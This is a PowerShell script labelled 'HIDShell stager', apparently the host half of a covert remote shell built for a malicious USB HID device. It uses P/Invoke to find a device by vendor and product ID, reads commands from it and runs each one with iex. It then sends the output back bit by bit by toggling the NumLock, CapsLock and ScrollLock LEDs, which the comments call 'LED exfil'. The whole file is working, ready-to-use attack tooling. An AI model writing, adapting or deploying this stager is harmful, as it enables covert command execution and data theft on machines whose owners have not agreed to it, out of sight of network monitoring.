# HIDShell stager — vendor HID commands + LED response
$log="$env:tmp\hs.log"
"[$(Get-Date)] stager starting" | Out-File $log
$VI=0x239A;$PI=0x8120;$UP=0xFF00;$RI=4

try {
Add-Type 'using System;using System.Runtime.InteropServices;using Microsoft.Win32.SafeHandles;public class H{[DllImport("kernel32.dll")]public static extern bool ReadFile(SafeFileHandle h,byte[]b,uint n,out uint r,IntPtr o);[DllImport("setupapi.dll")]public static extern IntPtr SetupDiGetClassDevs(ref Guid g,IntPtr e,IntPtr p,uint f);[DllImport("setupapi.dll")]public static extern bool SetupDiEnumDeviceInterfaces(IntPtr i,IntPtr d,ref Guid g,uint m,ref DI r);[DllImport("setupapi.dll",CharSet=CharSet.Auto)]public static extern bool SetupDiGetDeviceInterfaceDetail(IntPtr i,ref DI d,IntPtr t,uint s,out uint r,IntPtr x);[DllImport("setupapi.dll")]public static extern bool SetupDiDestroyDeviceInfoList(IntPtr i);[DllImport("hid.dll")]public static extern void HidD_GetHidGuid(out Guid g);[DllImport("hid.dll")]public static extern bool HidD_GetAttributes(SafeFileHandle h,ref A a);[DllImport("hid.dll")]public static extern bool HidD_GetPreparsedData(SafeFileHandle h,out IntPtr p);[DllImport("hid.dll")]public static extern int HidP_GetCaps(IntPtr p,out C c);[DllImport("hid.dll")]public static extern bool HidD_FreePreparsedData(IntPtr p);[DllImport("kernel32.dll",CharSet=CharSet.Auto)]public static extern SafeFileHandle CreateFile(string f,int a,uint s,IntPtr c,uint m,uint l,IntPtr t);[DllImport("user32.dll")]public static extern void keybd_event(byte k,byte s,uint f,UIntPtr x);[StructLayout(LayoutKind.Sequential)]public struct DI{public uint cb;public Guid g;public uint f;public IntPtr r;}[StructLayout(LayoutKind.Sequential)]public struct A{public uint s;public ushort v,p,n;}[StructLayout(LayoutKind.Sequential)]public struct C{public ushort u,up,il,ol,fl;[MarshalAs(UnmanagedType.ByValArray,SizeConst=17)]public ushort[]r;public ushort n1,n2,n3,n4,n5,n6,n7,n8,n9,n10;}public static int Z(object o){return Marshal.SizeOf(o);}}'
"[$(Get-Date)] Add-Type OK" | Out-File $log -Append
Add-Type 'using System;using System.Runtime.InteropServices;public class H2{[DllImport("user32.dll")]public static extern short GetKeyState(int k);}'
} catch {
"[$(Get-Date)] Add-Type FAILED: $_" | Out-File $log -Append; exit
}

# Device discovery — Diabolic Shell G function pattern
function G{
$g=[Guid]::Empty;[H]::HidD_GetHidGuid([ref]$g)
$s=[H]::SetupDiGetClassDevs([ref]$g,0,0,18)
if(!$s){return}
$n=0;$di=New-Object H+DI;$di.cb=[H]::Z($di)
while([H]::SetupDiEnumDeviceInterfaces($s,0,[ref]$g,$n++,[ref]$di)){
$r=0
[H]::SetupDiGetDeviceInterfaceDetail($s,[ref]$di,0,0,[ref]$r,0)>$x
$b=[Runtime.InteropServices.Marshal]::AllocHGlobal($r)
[Runtime.InteropServices.Marshal]::WriteInt32($b,$(if([IntPtr]::Size-eq8){8}else{5}))
if([H]::SetupDiGetDeviceInterfaceDetail($s,[ref]$di,$b,$r,[ref]$r,0)){
$path=[Runtime.InteropServices.Marshal]::PtrToStringAuto([IntPtr]::Add($b,4))
$h=[H]::CreateFile($path,-1073741824,3,0,3,0,0)
if(!$h.IsInvalid){
$a=New-Object H+A;$a.s=[H]::Z($a)
if([H]::HidD_GetAttributes($h,[ref]$a)-and$a.v-eq$VI-and$a.p-eq$PI){
$p=0
if([H]::HidD_GetPreparsedData($h,[ref]$p)){
$c=New-Object H+C
[H]::HidP_GetCaps($p,[ref]$c)>$x
[H]::HidD_FreePreparsedData($p)>$x
if(!$UP-or$c.up-eq$UP){
[Runtime.InteropServices.Marshal]::FreeHGlobal($b)
[H]::SetupDiDestroyDeviceInfoList($s)>$x
return @{H=$h;I=$c.il}
}}}
$h.Close()
}}
[Runtime.InteropServices.Marshal]::FreeHGlobal($b)
}
[H]::SetupDiDestroyDeviceInfoList($s)>$x
}

$d=G
if(!$d){"[$(Get-Date)] Device not found" | Out-File $log -Append; exit}
"[$(Get-Date)] Device found IL=$($d.I)" | Out-File $log -Append

# LED exfil — keybd_event toggles
# NumLock(0x90)=bit1, CapsLock(0x14)=bit0, ScrollLock(0x91)=byte commit
function TX([byte]$v){
$bits=@(128,64,32,16,8,4,2,1)
foreach($m in $bits){
$k=if($v -band $m){0x90}else{0x14}
[H]::keybd_event($k,0x45,1,[UIntPtr]::Zero)
Sleep -M 10
[H]::keybd_event($k,0x45,3,[UIntPtr]::Zero)
Sleep -M 50
}
[H]::keybd_event(0x91,0x45,1,[UIntPtr]::Zero)
Sleep -M 10
[H]::keybd_event(0x91,0x45,3,[UIntPtr]::Zero)
Sleep -M 60
}

function Send-Output($text){
$bytes=[Text.Encoding]::UTF8.GetBytes($text)
foreach($b in $bytes){TX $b}
Sleep -M 100
# Restore LEDs — turn off any that are on
foreach($k in @(0x90,0x14,0x91)){
# GetKeyState low bit = toggle state
$on = [bool]([int][H2]::GetKeyState($k) -band 1)
if($on){
[H]::keybd_event($k,0x45,1,[UIntPtr]::Zero);Sleep -M 10
[H]::keybd_event($k,0x45,3,[UIntPtr]::Zero);Sleep -M 30
}}
}

"[$(Get-Date)] Agent loop starting" | Out-File $log -Append
$bf="";$rx=0
while(1){
$b=[byte[]]::new($d.I);$r=0
if([H]::ReadFile($d.H,$b,$b.Length,[ref]$r,0)-and$r-gt0){
$s=[Text.Encoding]::ASCII.GetString($b,1,$b.Length-1).TrimEnd([char]0)
if($s){
if($s-match'<<START:\d+>>'){$bf="";$rx=1;$s=$s-replace'<<START:\d+>>'}
if($s-match'<<END>>'){
$s=$s-replace'<<END>>';$bf+=$s;$rx=0
$t=$bf.Trim()
"[$(Get-Date)] CMD: $t" | Out-File $log -Append
if($t){
try{$o=(iex $t 2>&1|Out-String).Trim()}catch{$o="ERR:$_"}
if(!$o){$o="OK"}
"[$(Get-Date)] OUT($($o.Length)): $($o.Substring(0,[Math]::Min(80,$o.Length)))" | Out-File $log -Append
Send-Output $o
"[$(Get-Date)] LED sent" | Out-File $log -Append
}
$bf=""
}elseif($rx){$bf+=$s}
}}
Sleep -M 5
}